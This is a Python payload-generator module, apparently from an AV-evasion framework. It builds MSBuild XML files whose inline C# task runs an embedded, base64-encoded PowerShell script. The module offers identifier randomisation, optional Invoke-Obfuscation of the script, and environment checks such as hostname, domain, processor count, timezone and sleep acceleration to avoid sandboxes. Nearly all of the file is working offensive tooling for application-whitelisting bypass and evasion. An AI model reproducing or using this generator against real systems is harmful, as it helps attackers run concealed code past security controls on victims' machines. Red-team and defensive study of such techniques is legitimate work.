"""

MSBuild C# unmanaged powershell embedded script execution.
Uses basic variable renaming obfuscation.
Optional: Obfuscate powershell embedded script with Invoke-Obfuscation

Code based on: https://gist.github.com/ConsciousHacker/a40204cbcf566d1f45d68508157d9aea

Module built by @ConsciousHacker

"""

import base64
from Tools.Bypass.bypass_common import bypass_helpers
from Tools.Bypass.bypass_common import gamemaker
from Tools.Bypass.bypass_common import invoke_obfuscation


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "msbuild"
        self.extension = "xml"
        self.rating = "Excellent"
        self.description = "MSBuild C# unmanaged powershell embedded script execution"
        self.name = "MSBuild C# Unmanaged powershell embedded script execution"
        self.path = "msbuild/powershell/script"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "SCRIPT"         : ["/root/script.ps1", "Path of the powershell script"],
            "FUNCTION"       : ["X", "Function to execute within the powershell script"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"],
            "OBFUSCATION"    : ["X", "Optional: Use python Invoke-Obfuscation on the powershell script (binary or ascii)"]
                                }

    def generate(self):

        # randomize all our variable names, yo'
        targetName = bypass_helpers.randomString()
        namespaceName = bypass_helpers.randomString()
        className = bypass_helpers.randomString()
        FunctionName = bypass_helpers.randomString()

        num_tabs_required = 0

        # get 12 random variables for the API imports
        r = [bypass_helpers.randomString() for x in range(12)]
        y = [bypass_helpers.randomString() for x in range(17)]

        with open(self.required_options["SCRIPT"][0], "r") as f:
            the_script = f.read()


        if self.required_options["OBFUSCATION"][0].lower() != "x":
                if self.required_options["FUNCTION"][0] != "x":
                    # Append FUNCTION to end of script
                    the_script += "\n{0}".format(self.required_options["FUNCTION"][0])
                    if self.required_options["OBFUSCATION"][0].lower() == "binary":
                        the_script = invoke_obfuscation.binaryEncode(the_script)
                    elif self.required_options["OBFUSCATION"][0].lower() == "ascii":
                        the_script = invoke_obfuscation.asciiEncode(the_script)
                    self.required_options["FUNCTION"][0] = "x"
                else:
                    if self.required_options["OBFUSCATION"][0].lower() == "binary":
                        the_script = invoke_obfuscation.binaryEncode(the_script)
                    elif self.required_options["OBFUSCATION"][0].lower() == "ascii":
                        the_script = invoke_obfuscation.asciiEncode(the_script)
                    self.required_options["FUNCTION"][0] = "x"


        if self.required_options["FUNCTION"][0].lower() != "x":
            # The header for MSBuild XML files
            # TODO: Fix the awful formatting
            # Set FUNCTION to None if using Invoke-Obfuscation
            msbuild_header = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->\n\t
            <PropertyGroup>
                <FunctionName Condition="'$(FunctionName)' == ''">{2}</FunctionName>
            </PropertyGroup>
            <Target Name="{0}">
                <{1} />
              </Target>
              <UsingTask
                TaskName="{1}"
                TaskFactory="CodeTaskFactory"
                AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
                <Task>
                    <Reference Include="System.Management.Automation" />
                <Code Type="Class" Language="cs">
                  <![CDATA[
            """.format(targetName, className, self.required_options["FUNCTION"][0])
        else:
            # The header for MSBuild XML files
            # TODO: Fix the awful formatting
            # Set FUNCTION to None if using Invoke-Obfuscation
            msbuild_header = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n\t
            <PropertyGroup>
                <FunctionName Condition="'$(FunctionName)' == ''">{2}</FunctionName>
            </PropertyGroup>
            <Target Name="{0}">
                <{1} />
              </Target>
              <UsingTask
                TaskName="{1}"
                TaskFactory="CodeTaskFactory"
                AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
                <Task>
                    <Reference Include="System.Management.Automation" />
                <Code Type="Class" Language="cs">
                  <![CDATA[
            """.format(targetName, className, "None")

            if self.required_options["OBFUSCATION"][0].lower() != "x":
                if self.required_options["OBFUSCATION"][0].lower() == "binary":
                    the_script = invoke_obfuscation.binaryEncode(the_script)
                elif self.required_options["OBFUSCATION"][0].lower() == "ascii":
                    the_script = invoke_obfuscation.asciiEncode(the_script)


        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Threading; using System.IO; using System.Reflection; using System.Runtime.InteropServices; using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n"
        payload_code += "public class %s : Task, ITask {\n" % (className)
        payload_code += "\npublic string {0} = \"$(FunctionName)\";".format(FunctionName)

        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2

        encodedScript = bypass_helpers.randomString()
        encodedScriptContents = base64.b64encode(bytes(the_script, 'latin-1')).decode('ascii')
        powershellCmd = bypass_helpers.randomString()
        data = bypass_helpers.randomString()
        command = bypass_helpers.randomString()
        RunPSCommand = bypass_helpers.randomString()
        cmd = bypass_helpers.randomString()
        runspace = bypass_helpers.randomString()
        scriptInvoker = bypass_helpers.randomString()
        pipeline = bypass_helpers.randomString()
        results = bypass_helpers.randomString()
        stringBuilder = bypass_helpers.randomString()
        obj = bypass_helpers.randomString()
        RunPSFile = bypass_helpers.randomString()
        script = bypass_helpers.randomString()
        ps = bypass_helpers.randomString()
        e = bypass_helpers.randomString()

        payload_code += """string {0} = "{1}";
                    string {2} = "";

					if ({3} != "None")
					{{
						byte[] {4} = Convert.FromBase64String({0});
						string {5} = Encoding.ASCII.GetString({4});
						{2} = {5} + "" + {3};
					}}
                    else
                    {{
                        byte[] {4} = Convert.FromBase64String({0});
                        string {5} = Encoding.ASCII.GetString({4});
                        {2} = {5};
                    }}

					try
					{{
						Console.Write({6}({2}));
					}}
					catch (Exception {7})
					{{
						Console.Write({7}.Message);
					}}""".format(encodedScript, encodedScriptContents, powershellCmd, FunctionName, data, command, RunPSCommand, e)

        while (num_tabs_required != 0):
            payload_code += '\t' * num_tabs_required + '}'
            num_tabs_required -= 1

        payload_code +="""return true;
				}}

				//Based on Jared Atkinson's And Justin Warner's Work
				public static string {0}(string {1})
				{{

					Runspace {2} = RunspaceFactory.CreateRunspace();
					{2}.Open();
					RunspaceInvoke {3} = new RunspaceInvoke({2});
					Pipeline {4} = {2}.CreatePipeline();


					{4}.Commands.AddScript({1});


					{4}.Commands.Add("Out-String");
					Collection<PSObject> {5} = {4}.Invoke();
					{2}.Close();


					StringBuilder {6} = new StringBuilder();
					foreach (PSObject {7} in {5})
					{{
						{6}.Append({7});
					}}
					return {6}.ToString().Trim();
				 }}

				 public static void {8}(string {9})
				{{
					PowerShell {10} = PowerShell.Create();
					{10}.AddScript({9}).Invoke();
				}}""".format(RunPSCommand, cmd, runspace, scriptInvoker, pipeline, results, stringBuilder, obj, RunPSFile, script, ps)

        payload_code += "}\n\t\t\t\t]]>\n\t\t\t</Code>\n\t\t</Task>\n\t</UsingTask>\n</Project>"
        payload_code = msbuild_header + payload_code

        self.payload_source_code = payload_code
        return
